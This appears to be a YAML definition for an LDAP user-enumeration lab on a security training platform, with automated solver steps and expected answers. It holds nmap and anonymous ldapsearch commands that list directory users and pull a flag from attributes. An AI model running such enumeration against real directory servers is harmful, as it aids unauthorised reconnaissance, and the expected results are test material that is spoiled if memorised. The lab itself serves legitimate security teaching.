lab_id: windows-7-4-ldap-user-enumeration
track: Windows
difficulty: intermediate
source: platform/labs/Windows/windows-7-4-ldap-user-enumeration/lab.yaml
expected_services:
- port: 389
  protocol: tcp
health_timeout_seconds: 60
solver:
  image: ocr-tester:latest
  command: /tests/windows-7-4-ldap-user-enumeration.sh
  steps:
  - name: Verify LDAP port 389 is open
    command: nmap -Pn -p 389 {target.target} | grep '389/tcp'
    expect: open
  - name: Enumerate users via anonymous LDAP bind
    command: ldapsearch -x -H ldap://{target.target} -b 'dc=financecorp,dc=local' '(objectClass=posixAccount)' uid 2>&1 | grep '^uid:'
    expect: jmitchell
  - name: LDAP search for flag
    command: ldapsearch -x -H ldap://{target.target} -b 'dc=financecorp,dc=local' description 2>&1 | grep 'OCR{' || (sleep 3 && ldapsearch -x -H ldap://{target.target} -b 'dc=financecorp,dc=local' description 2>&1 | grep 'OCR{')
    expect: OCR{
expected_flag_count: 1
expected_flag: '{flag}'
forbidden_networks:
- control-plane
- database
- other-learners
max_memory_mb: 768
max_cpu: 0.75
